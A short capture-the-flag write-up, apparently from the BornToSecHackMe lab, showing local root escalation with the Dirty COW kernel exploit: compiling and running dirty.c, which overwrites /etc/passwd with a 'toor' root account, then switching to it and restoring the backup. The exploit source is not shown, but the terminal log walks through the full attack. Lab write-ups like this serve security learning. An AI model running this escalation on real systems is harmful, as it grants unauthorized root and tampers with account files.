# dirtyc0w - /etc/passwd based root

First, we log in as the `zaz` user. Then, we create a file called `dirty.c` and paste the script into it. This script creates a backup of `/etc/passwd` and overrides the current root user with a new one and our password. After we compile and run it, we can switch users and gain root privileges.

```
zaz@BornToSecHackMe:~$ whoami
zaz
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
zaz@BornToSecHackMe:~$ vim dirty.c
zaz@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
zaz@BornToSecHackMe:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 42
Complete line:
toor:toMoN4jM5NeXg:0:0:pwned:/root:/bin/bash

mmap: b7fda000
^C
zaz@BornToSecHackMe:~$ su toor
Password: 42
toor@BornToSecHackMe:/home/zaz# id
uid=0(toor) gid=0(root) groups=0(root)
toor@BornToSecHackMe:/home/zaz# whoami
toor
```

We can restore the file with our backup to get back to the original users list and password.

```
toor@BornToSecHackMe:/home/zaz#  mv /tmp/passwd.bak /etc/passwd
toor@BornToSecHackMe:/home/zaz# exit
exit
su: User not known to the underlying authentication module
zaz@BornToSecHackMe:~$ su toor
Unknown id: toor
```